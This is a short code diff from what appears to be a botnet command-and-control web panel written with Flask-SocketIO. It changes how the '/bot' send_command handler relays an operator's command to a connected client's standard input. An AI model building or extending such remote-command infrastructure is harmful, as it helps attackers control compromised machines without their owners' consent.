@@ -63,7 +63,7 @@ def index():
 @socketio.on('send_command', namespace='/bot')
 def send(cmd):
     try:
-        botnet.getConnection(connected).send(cmd['data']+"\n")
+        sent = botnet.sendStdin(connected, cmd['data']+"\n")
     except:
         emit('response',
              {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(connected), 'user': connected})
